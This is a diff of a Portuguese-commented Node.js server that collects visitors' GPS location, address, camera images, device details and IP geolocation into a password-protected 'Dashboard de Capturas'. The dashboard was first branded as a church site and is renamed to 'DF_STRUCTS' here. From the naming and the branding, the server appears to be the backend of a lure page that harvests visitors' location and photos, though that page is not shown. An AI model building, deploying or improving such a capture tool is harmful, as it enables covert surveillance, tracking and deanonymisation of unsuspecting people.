@@ -10,7 +10,6 @@ function autenticar(req, res, next) {
   }
   next();
 }
-
 // ========== DEPENDÊNCIAS ==========
 const axios = require('axios');
 const express = require('express');
@@ -21,10 +20,8 @@ const app = express();
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '10mb' }));
 app.set('trust proxy', true);
-
 // ========== ARMAZENAMENTO ==========
 let dadosRecebidos = [];
-
 // ========== FUNÇÃO MELHORADA PARA OBTER IP PÚBLICO REAL (com foco em IPv4 visível) ==========
 async function obterIPPublicoReal(req) {
   try {
@@ -41,7 +38,6 @@ async function obterIPPublicoReal(req) {
       trueClientIP: req.headers['true-client-ip'],
       forwarded: req.headers['forwarded']
     };
-
     let clientIP = null;
     if (ips.xForwardedFor) {
       clientIP = ips.xForwardedFor.split(',')[0].trim();
@@ -56,35 +52,29 @@ async function obterIPPublicoReal(req) {
     } else {
       clientIP = ips.remoteAddress || ips.socketAddress || ips.connectionSocket || ips.reqIP;
     }
-
     if (clientIP && clientIP.startsWith('::ffff:')) {
       clientIP = clientIP.substring(7);
     }
-
     let ipPublicoReal = clientIP;
     let ipPublicoIPv4Real = null; // Vamos buscar um IPv4 público real
     let dadosGeoIP = {};
-
     const isPrivateIP = clientIP && (
-      clientIP.startsWith('192.168.') || 
-      clientIP.startsWith('10.') || 
-      clientIP.startsWith('172.') || 
-      clientIP === '127.0.0.1' || 
+      clientIP.startsWith('192.168.') ||
+      clientIP.startsWith('10.') ||
+      clientIP.startsWith('172.') ||
+      clientIP === '127.0.0.1' ||
       clientIP === '::1' ||
       clientIP === 'localhost' ||
       clientIP.startsWith('169.254.')
     );
-
-    // Lista de serviços que retornam apenas IPv4 (os mais confiáveis)
     const servicosIPv4 = [
-      'https://api.ipify.org?format=json',           // Muito confiável
-      'https://checkip.amazonaws.com',               // Retorna só IPv4
-      'https://ifconfig.me/ip',                      // Simples e direto
-      'https://icanhazip.com',                       // IPv4 por padrão
-      'https://ident.me',                            // Retorna IPv4
+      'https://api.ipify.org?format=json',
+      'https://checkip.amazonaws.com',
+      'https://ifconfig.me/ip',
+      'https://icanhazip.com',
+      'https://ident.me',
       'https://myexternalip.com/raw'
     ];
-
     if (isPrivateIP || !clientIP.includes('.')) {
       for (const servico of servicosIPv4) {
         try {
@@ -97,10 +87,9 @@ async function obterIPPublicoReal(req) {
           } else if (typeof response.data === 'string') {
             ip = response.data.trim();
           }
-          // Verifica se é IPv4 válido
           if (ip && ip.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
             ipPublicoIPv4Real = ip;
-            ipPublicoReal = ip; // Usa o IPv4 como principal se não tiver
+            ipPublicoReal = ip;
             break;
           }
         } catch (err) {
@@ -108,19 +97,14 @@ async function obterIPPublicoReal(req) {
         }
       }
     } else if (clientIP.includes('.')) {
-      // Se já for um IPv4, validamos e usamos
       if (clientIP.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
         ipPublicoIPv4Real = clientIP;
       }
     }
-
-    // Se não conseguiu IPv4, marcar como não disponível
     if (!ipPublicoIPv4Real) {
       ipPublicoIPv4Real = 'Não disponível';
     }
-
     const ipParaGeo = ipPublicoIPv4Real !== 'Não disponível' ? ipPublicoIPv4Real : ipPublicoReal;
-
     const geoServicos = [
       `http://ip-api.com/json/${ipParaGeo}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
       `https://ipapi.co/${ipParaGeo}/json/`,
@@ -150,12 +134,11 @@ async function obterIPPublicoReal(req) {
         console.log(`❌ Falha no serviço Geo: ${servicoGeo}`, err.message);
       }
     }
-
     return {
       ipOriginal: clientIP,
       ipPublico: ipPublicoReal,
       ipPublicoOperadora: ipPublicoReal,
-      ipPublicoIPv4Real, // Novo campo: IPv4 real visível no "meu ip"
+      ipPublicoIPv4Real,
       ipv4: (clientIP && clientIP.includes('.')) ? clientIP : 'Não detectado',
       ipv6: (clientIP && clientIP.includes(':') && !clientIP.startsWith('::ffff:')) ? clientIP : 'Não detectado',
       todosIPs: ips,
@@ -205,7 +188,6 @@ async function obterIPPublicoReal(req) {
     };
   }
 }
-
 // ========== REVERSE GEOCODING (Obter CEP a partir de coordenadas) ==========
 async function obterCepPorCoordenadas(lat, lon) {
   try {
@@ -221,10 +203,13 @@ async function obterCepPorCoordenadas(lat, lon) {
     return 'Erro ao obter CEP';
   }
 }
-
 // ========== ROTA DE CAPTURA ==========
+// ========== ROTA DE CAPTURA MODIFICADA PARA USAR O IP DO FRONTEND ==========
 app.post('/dados', async (req, res) => {
-  const { latitude, longitude, endereco, imagem, sistema, navegador } = req.body;
+  // 1. Desestruture os dados recebidos, INCLUINDO 'ip'
+  const { latitude, longitude, endereco, imagem, sistema, navegador, ip: ipFrontend } = req.body;
+  console.log("Dados recebidos no /dados:", { latitude, longitude, endereco, sistema, navegador, ipFrontend }); // Log para debug
+
   let fileName = null;
   if (imagem) {
     const pastaCapturas = path.join(__dirname, 'public', 'capturas');
@@ -237,9 +222,130 @@ app.post('/dados', async (req, res) => {
     fs.writeFileSync(caminhoImagem, base64Data, 'base64');
   }
 
-  const dadosIP = await obterIPPublicoReal(req);
+  // 2. Inicialize as variáveis de IP
+  let ipFinal = 'IP não informado';
+  let dadosIP = {
+    ipOriginal: 'Não utilizado',
+    ipPublico: 'Não utilizado',
+    ipPublicoOperadora: 'Não utilizado',
+    ipPublicoIPv4Real: 'IP não informado',
+    ipv4: 'Não detectado',
+    ipv6: 'Não detectado',
+    ehIPPrivado: null,
+    geolocalizacao: {
+      pais: 'Não informado',
+      codigoPais: 'N/A',
+      estado: 'Não informado',
+      cidade: 'Não informado',
+      cep: 'Não informado',
+      latitude: null,
+      longitude: null,
+      timezone: 'Não informado'
+    },
+    provedor: {
+      isp: 'Desconhecido',
+      organizacao: 'Desconhecida',
+      sistemaAutonomo: 'Não informado'
+    },
+    todosIPs: {}
+  };
 
-  // Obter CEP do GPS automaticamente se coordenadas forem fornecidas
+  // 3. Validar o IP capturado pelo frontend
+  const ipFrontendValido = ipFrontend &&
+                           typeof ipFrontend === 'string' &&
+                           ipFrontend.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/);
+
+  if (ipFrontendValido) {
+    console.log(`✅ Usando IP capturado pelo frontend: ${ipFrontend}`);
+    ipFinal = ipFrontend;
+    // 4. Tentar obter geolocalização para o IP do frontend
+    try {
+        const geoServicos = [
+          `http://ip-api.com/json/${ipFrontend}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`
+          // Adicionei apenas um serviço por simplicidade e velocidade. Você pode adicionar mais se quiser.
+        ];
+        let dadosGeoIP = {};
+        let geoSucesso = false;
+        for (const servicoGeo of geoServicos) {
+          try {
+            console.log(`🔍 Tentando geolocalizar IP ${ipFrontend} via ${servicoGeo}...`);
+            const geoResponse = await axios.get(servicoGeo, { timeout: 8000 });
+            if (geoResponse.data.status === 'success' && geoResponse.data.country) {
+              dadosGeoIP = {
+                country: geoResponse.data.country,
+                countryCode: geoResponse.data.countryCode,
+                region: geoResponse.data.region,
+                regionName: geoResponse.data.regionName,
+                city: geoResponse.data.city,
+                zip: geoResponse.data.zip,
+                lat: geoResponse.data.lat,
+                lon: geoResponse.data.lon,
+                timezone: geoResponse.data.timezone,
+                isp: geoResponse.data.isp,
+                org: geoResponse.data.org,
+                as: geoResponse.data.as
+              };
+              console.log(`✅ Geolocalização obtida via ${servicoGeo}`);
+              geoSucesso = true;
+              break; // Sai do loop se obteve sucesso
+            } else {
+                console.log(`⚠️ Resposta inválida de ${servicoGeo}:`, geoResponse.data);
+            }
+          } catch (geoErr) {
+             console.log(`⚠️ Erro na geolocalização via ${servicoGeo}:`, geoErr.message);
+          }
+        }
+
+        if (geoSucesso) {
+            // Atualiza os campos relevantes no objeto dadosIP para o registro
+            dadosIP.geolocalizacao = {
+                pais: dadosGeoIP.country || 'Não informado',
+                codigoPais: dadosGeoIP.countryCode || 'N/A',
+                estado: dadosGeoIP.regionName || 'Não informado',
+                cidade: dadosGeoIP.city || 'Não informado',
+                cep: dadosGeoIP.zip || 'Não informado',
+                latitude: dadosGeoIP.lat || null,
+                longitude: dadosGeoIP.lon || null,
+                timezone: dadosGeoIP.timezone || 'Não informado'
+            };
+            dadosIP.provedor = {
+                isp: dadosGeoIP.isp || 'Desconhecido',
+                organizacao: dadosGeoIP.org || 'Desconhecida',
+                sistemaAutonomo: dadosGeoIP.as || 'Não informado'
+            };
+        } else {
+             console.log(`⚠️ Não foi possível obter geolocalização para o IP ${ipFrontend}.`);
+        }
+        // Atualiza os campos principais de IP
+        dadosIP.ipPublicoIPv4Real = ipFrontend;
+        dadosIP.ipPublico = ipFrontend;
+        dadosIP.ipPublicoOperadora = ipFrontend;
+        dadosIP.ipv4 = ipFrontend; // Assume que é IPv4
+
+    } catch (updateErr) {
+        console.error("💥 Erro ao atualizar dados com IP do frontend:", updateErr);
+        // Mesmo se falhar na geoloc, ainda usa o IP
+        dadosIP.ipPublicoIPv4Real = ipFrontend;
+        dadosIP.ipPublico = ipFrontend;
+        dadosIP.ipPublicoOperadora = ipFrontend;
+        dadosIP.ipv4 = ipFrontend;
+    }
+  } else {
+    console.log(`⚠️ IP do frontend inválido ou não enviado: '${ipFrontend}'.`);
+    // Fallback: tenta usar o IP do servidor/proxy (método antigo)
+    console.log("🔄 Tentando obter IP via cabeçalhos do servidor...");
+    const dadosIPServidor = await obterIPPublicoReal(req);
+    ipFinal = dadosIPServidor.ipPublicoIPv4Real;
+    if (ipFinal && ipFinal !== 'Não disponível' && ipFinal !== 'Erro') {
+        console.log(`✅ Usando IP obtido pelo servidor: ${ipFinal}`);
+        // Reutiliza os dados obtidos pela função original
+        dadosIP = dadosIPServidor;
+    } else {
+        console.log("❌ Nenhum IP válido encontrado.");
+        ipFinal = 'Erro ao determinar IP';
+    }
+  }
+
   let cepGPS = 'Não informado';
   if (latitude && longitude) {
     cepGPS = await obterCepPorCoordenadas(latitude, longitude);
@@ -253,10 +359,11 @@ app.post('/dados', async (req, res) => {
     navegador,
     imagem: fileName,
     horario: new Date().toLocaleString(),
+    // Usando os valores potencialmente atualizados
     ipOriginal: dadosIP.ipOriginal,
     ipPublico: dadosIP.ipPublico,
     ipPublicoOperadora: dadosIP.ipPublicoOperadora,
-    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real, // Novo campo adicionado
+    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real, // <- Este é o campo crucial
     ipv4: dadosIP.ipv4,
     ipv6: dadosIP.ipv6,
     ehIPPrivado: dadosIP.ehIPPrivado,
@@ -270,15 +377,16 @@ app.post('/dados', async (req, res) => {
     timezone: dadosIP.geolocalizacao.timezone,
     operadora: dadosIP.provedor.isp,
     organizacao: dadosIP.provedor.organizacao,
-    sistemaAutonomo: dadosIP.provedor.as,
+    sistemaAutonomo: dadosIP.provedor.sistemaAutonomo,
     todosIPs: dadosIP.todosIPs,
-    cepGPS
+    cepGPS,
+    ipFrontendCapturado: ipFrontend // Para debug
   };
 
   dadosRecebidos.push(registro);
+  console.log(`✅ Registro salvo para IP: ${registro.ipPublicoIPv4Real}`); // Log para confirmar
   res.send('Dados recebidos com sucesso!');
 });
-
 // ========== ROTA DE ACESSO VIA INDEX ==========
 app.post('/acesso', async (req, res) => {
   const horario = new Date().toLocaleString();
@@ -311,12 +419,15 @@ app.post('/acesso', async (req, res) => {
   dadosRecebidos.push(registro);
   res.sendStatus(200);
 });
-
+// ========== ROTA PARA LIMPAR REGISTROS ==========
+app.post('/limpar-registros', autenticar, (req, res) => {
+  dadosRecebidos = [];
+  res.json({ message: 'Registros limpos com sucesso!' });
+});
 // ========== ROTA JSON PARA FRONT ==========
 app.get('/dados-json', autenticar, (req, res) => {
   res.json(dadosRecebidos);
 });
-
 // ========== DASHBOARD HTML DINÂMICO ==========
 app.get('/dashboard', autenticar, (req, res) => {
   const html = `
@@ -324,7 +435,7 @@ app.get('/dashboard', autenticar, (req, res) => {
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Dashboard - Igreja Esperança Viva</title>
+  <title>Dashboard - DF_STRUCTS</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
     body {
@@ -363,6 +474,13 @@ app.get('/dashboard', autenticar, (req, res) => {
     }
     .botao-atualizar:hover {
       background-color: #25e06d;
+    }
+    .botao-limpar {
+      background-color: #ff4757;
+      box-shadow: 0 0 8px rgba(255, 71, 87, 0.6);
+    }
+    .botao-limpar:hover {
+      background-color: #ff6b81;
     }
     .area-botoes {
       margin-bottom: 24px;
@@ -469,20 +587,137 @@ app.get('/dashboard', autenticar, (req, res) => {
       background-color: #4ac789;
       box-shadow: 0 0 7px #49d17eaa;
     }
+    /* Logo DF_STRUCTS no canto superior direito */
+    .logo-dfstructs {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      width: 120px;
+      height: 120px;
+      object-fit: contain;
+      z-index: 10;
+    }
+    /* Estilização do "Último Acesso" com gradiente */
+    .ultimo-acesso {
+      font-size: 1.4rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #7D60FF, #0F9B58);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      color: transparent;
+    }
+    /* Modal de confirmação */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+    }
+    .modal-content {
+      background-color: #20202a;
+      margin: 15% auto;
+      padding: 30px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 500px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(125, 96, 255, 0.5);
+    }
+    .modal-buttons {
+      margin-top: 25px;
+    }
+    .modal-button {
+      padding: 12px 25px;
+      margin: 0 10px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .modal-confirm {
+      background-color: #ff4757;
+      color: white;
+    }
+    .modal-cancel {
+      background-color: #7D60FF;
+      color: white;
+    }
+    .modal-button:hover {
+      opacity: 0.9;
+      transform: translateY(-2px);
+    }
   </style>
 </head>
 <body>
+  <!-- Logo no canto superior direito -->
+  <div class="logo-dfstructs">
+    <img src="/dfstructs-logo.png" alt="Logo DF_STRUCTS" />
+  </div>
+  
+  <!-- Modal de confirmação -->
+  <div id="confirmModal" class="modal">
+    <div class="modal-content">
+      <h2>⚠️ Confirmar Limpeza</h2>
+      <p>Tem certeza que deseja limpar todos os registros? Esta ação não pode ser desfeita.</p>
+      <div class="modal-buttons">
+        <button class="modal-button modal-cancel" onclick="fecharModal()">Cancelar</button>
+        <button class="modal-button modal-confirm" onclick="confirmarLimpeza()">Limpar Registros</button>
+      </div>
+    </div>
+  </div>
+
   <h1>📊 Dashboard de Capturas - IP Público Real</h1>
   <div class="area-botoes">
     <button class="botao" id="btn-exportar">📄 Exportar para PDF</button>
     <button class="botao botao-atualizar" id="btn-atualizar">🔄 Atualizar</button>
+    <button class="botao botao-limpar" id="btn-limpar">🗑️ Limpar Registros</button>
   </div>
   <div class="stats" id="stats"></div>
   <div id="dashboard-container"></div>
-
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script>
     let dadosGlobais = [];
+    
+    // Função para abrir o modal de confirmação
+    function abrirModal() {
+      document.getElementById('confirmModal').style.display = 'block';
+    }
+    
+    // Função para fechar o modal
+    function fecharModal() {
+      document.getElementById('confirmModal').style.display = 'none';
+    }
+    
+    // Função para confirmar a limpeza
+    async function confirmarLimpeza() {
+      try {
+        const response = await fetch('/limpar-registros', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+        
+        if (response.ok) {
+          fecharModal();
+          atualizarDashboard();
+          alert('✅ Registros limpos com sucesso!');
+        } else {
+          throw new Error('Falha ao limpar registros');
+        }
+      } catch (error) {
+        console.error('Erro ao limpar registros:', error);
+        alert('❌ Erro ao limpar registros: ' + error.message);
+        fecharModal();
+      }
+    }
+    
     async function atualizarDashboard() {
       try {
         const res = await fetch('/dados-json');
@@ -493,7 +728,6 @@ app.get('/dashboard', autenticar, (req, res) => {
         const acessos = dados.filter(d => d.origem === 'index.html').length;
         const ipsUnicos = [...new Set(dados.map(d => d.ipPublicoIPv4Real))].length;
         const ultimo = total > 0 ? dados[total - 1].horario : '-';
-
         document.getElementById('stats').innerHTML = \`
           <div class="stat-card">
             <div class="stat-number">\${total}</div>
@@ -511,12 +745,11 @@ app.get('/dashboard', autenticar, (req, res) => {
             <div class="stat-number">\${ipsUnicos}</div>
             <div>IPs IPv4 Únicos</div>
           </div>
-          <div class="stat-card" style="color: #8888bb; font-size: 0.85rem;">
-            <div>Último Acesso</div>
-            <div>\${ultimo}</div>
+          <div class="stat-card">
+            <div class="ultimo-acesso">Último Acesso</div>
+            <div class="ultimo-acesso">\${ultimo}</div>
           </div>
         \`;
-
         const container = document.getElementById('dashboard-container');
         container.innerHTML = dados.slice().reverse().map((dado, idx) => \`
           <div class="card basic">
@@ -580,14 +813,14 @@ app.get('/dashboard', autenticar, (req, res) => {
         document.getElementById('dashboard-container').innerHTML = '<p style="color:#f33;">Erro ao carregar os dados.</p>';
       }
     }
-
+    
     function exportarPDF() {
       try {
         const { jsPDF } = window.jspdf;
         const doc = new jsPDF({ unit: 'pt' });
         doc.setFontSize(20);
         doc.setTextColor('#7c6cff');
-        doc.text('Dashboard - Igreja Esperança Viva', 40, 40);
+        doc.text('Dashboard - DF_STRUCTS', 40, 40);
         doc.setFontSize(14);
         doc.setTextColor('#555555');
         doc.text('Relatório de IPs Públicos e Capturas', 40, 65);
@@ -615,6 +848,23 @@ app.get('/dashboard', autenticar, (req, res) => {
           doc.text(\`Organização: \${dado.organizacao || '-'}\`, 50, y); y += 15;
           const sistemaTexto = dado.sistema ? (dado.sistema.length > 80 ? dado.sistema.substring(0, 80) + '...' : dado.sistema) : '-';
           doc.text(\`Sistema: \${sistemaTexto}\`, 50, y); y += 25;
+          // Adicionar imagem capturada
+          if (dado.imagem) {
+            const imagePath = '/capturas/' + dado.imagem;
+            const imgData = new Image();
+            imgData.src = imagePath;
+            // Aguardar a imagem ser carregada antes de adicionar ao PDF
+            imgData.onload = () => {
+              const imgWidth = 150; // Largura da imagem no PDF
+              const imgHeight = (imgData.height * imgWidth) / imgData.width; // Manter proporção
+              doc.addImage(imgData, 'PNG', 50, y, imgWidth, imgHeight);
+              y += imgHeight + 15; // Avançar Y após adicionar a imagem
+            };
+            // Certificar-se de que a imagem foi carregada
+            if (!imgData.complete) {
+              return;
+            }
+          }
         });
         doc.save(\`dashboard-ips-publicos-\${Date.now()}.pdf\`);
         console.log('📄 PDF exportado com sucesso!');
@@ -622,9 +872,20 @@ app.get('/dashboard', autenticar, (req, res) => {
         alert('Erro ao exportar PDF: ' + ex.message);
       }
     }
-
+    
+    // Event listeners
     document.getElementById('btn-exportar').addEventListener('click', exportarPDF);
     document.getElementById('btn-atualizar').addEventListener('click', atualizarDashboard);
+    document.getElementById('btn-limpar').addEventListener('click', abrirModal);
+    
+    // Fechar modal ao clicar fora dele
+    window.onclick = function(event) {
+      const modal = document.getElementById('confirmModal');
+      if (event.target == modal) {
+        fecharModal();
+      }
+    }
+    
     setInterval(atualizarDashboard, 15000);
     atualizarDashboard();
   </script>
@@ -632,36 +893,30 @@ app.get('/dashboard', autenticar, (req, res) => {
 </html>`;
   res.send(html);
 });
-
 // ========== ROTA DE TESTE DE IP ==========
 app.get('/meu-ip', async (req, res) => {
   const dadosIP = await obterIPPublicoReal(req);
   res.json({ message: 'Seu IP público IPv4 real (como no meuip)', dados: dadosIP });
 });
-
 // ========== MIDDLEWARE DE LOG ==========
 app.use((req, res, next) => {
   console.log('📝 ' + new Date().toLocaleString() + ' - ' + req.method + ' ' + req.path + ' - IP: ' + req.ip);
   next();
 });
-
 // ========== TRATAMENTO DE ERROS ==========
 app.use((err, req, res, next) => {
   console.error('💥 Erro no servidor:', err.message);
   res.status(500).json({ error: 'Erro interno do servidor' });
 });
-
 // ========== ROTA RAIZ ==========
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
-
 // ========== CONFIGURAÇÃO HTTPS ==========
 const options = {
   key: fs.readFileSync('key.pem'),
   cert: fs.readFileSync('cert.pem')
 };
-
 // ========== INICIALIZAÇÃO DO SERVIDOR ==========
 https.createServer(options, app).listen(3000, () => {
   console.log('🔒 Servidor HTTPS rodando na porta 3000');
